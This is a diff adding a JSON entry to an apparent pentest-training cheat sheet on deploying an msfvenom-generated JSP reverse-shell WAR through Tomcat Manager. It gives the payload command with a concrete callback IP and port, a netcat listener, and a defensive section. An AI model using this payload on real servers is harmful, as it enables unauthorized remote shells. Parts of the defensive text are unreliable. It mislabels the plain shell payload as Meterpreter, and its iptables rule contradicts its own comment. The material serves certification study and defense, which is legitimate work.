@@ -1,0 +1,90 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "msfvenom"
+  ],
+  "tags": [
+    "tomcat",
+    "reverse-shell",
+    "war"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Tomcat",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Generate a JSP reverse-shell WAR",
+      "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.198 LPORT=4443 -f war > backup.war"
+    },
+    {
+      "label": "Catch the shell on a listener",
+      "command": "nc -lnvp 4443"
+    }
+  ],
+  "notes": "Same deploy path as the manual WAR but yields an interactive reverse shell instead of a command webshell - start the listener before you deploy.",
+  "references": [
+    {
+      "title": "Metasploit Framework",
+      "url": "https://www.metasploit.com/"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "tomcat-mgr-bruteforce",
+      "note": "Provides the manager creds to deploy the WAR.",
+      "rel": "prereq"
+    },
+    {
+      "id": "tomcat-war-webshell",
+      "note": "Interactive command-webshell alternative.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "tomcat-msfvenom-war",
+  "name": "Tomcat - msfvenom WAR Reverse Shell",
+  "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war > backup.war",
+  "description": "Generates a JSP reverse-shell WAR to deploy via Manager; catch the callback with a netcat listener for an interactive shell.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "msfvenom generates a WAR wrapping a JSP Meterpreter stager. Deployed via Tomcat Manager, requesting the JSP connects back to the Metasploit handler delivering a full interactive session.",
+    "prerequisites": "Valid Tomcat Manager credentials. Network connectivity from Tomcat server to Metasploit listener.",
+    "impact": "Full Meterpreter session: hashdump, network pivoting, keylogging, filesystem access -- all from the Tomcat process context.",
+    "detection": "WAR deployment to Tomcat Manager. Outbound TCP from Tomcat process to attacker IP. Unusual Java process spawning child processes. EDR: Meterpreter beacon pattern.",
+    "artifacts": "Tomcat manager access log (WAR upload) | Network flow: java -> attacker IP on high port | EDR/AV: Meterpreter staging payload | Process tree: java -> meterpreter",
+    "prevention": "Lock down Tomcat Manager (localhost-only, strong credentials). Egress firewall rules from web server denying non-HTTP outbound. Deploy EDR on the server. Network segmentation to prevent reverse connections.",
+    "misconfiguration": "Tomcat Manager accessible from internet with weak credentials. No egress filtering. No EDR on Tomcat host.",
+    "vulnerable_config": "# Tomcat -- manager app accessible from any IP\n# conf/context.xml -- Valve removed or allows all\n<!-- Valve className=\"org.apache.catalina.valves.RemoteAddrValve\" allow=\"127\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1\" /> -->\n# Commented out = manager accessible from 0.0.0.0/0\n\n# conf/tomcat-users.xml -- manager-gui role assigned\n<role rolename=\"manager-script\"/>\n<user username=\"tomcat\" password=\"tomcat\" roles=\"manager-script\"/>\n\n# OS -- no egress filter, outbound TCP unrestricted",
+    "secure_config": "# Tomcat -- restrict manager to localhost only\n# conf/context.xml\n<Context>\n  <Valve className=\"org.apache.catalina.valves.RemoteAddrValve\"\n         allow=\"127\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1|10\\.0\\.0\\.0/8\"/>\n</Context>\n\n# conf/tomcat-users.xml -- strong credentials, minimal roles\n<role rolename=\"manager-script\"/>\n<user username=\"deploy_svc\" password=\"Str0ng!R4nd0mP4ss\" roles=\"manager-script\"/>\n\n# iptables -- restrict outbound from Tomcat process\niptables -A OUTPUT -m owner --uid-owner tomcat -j DROP  # block all outbound except approved",
+    "sources": [
+      "HTB M24",
+      "MITRE T1505.003",
+      "MITRE T1190"
+    ]
+  }
+}
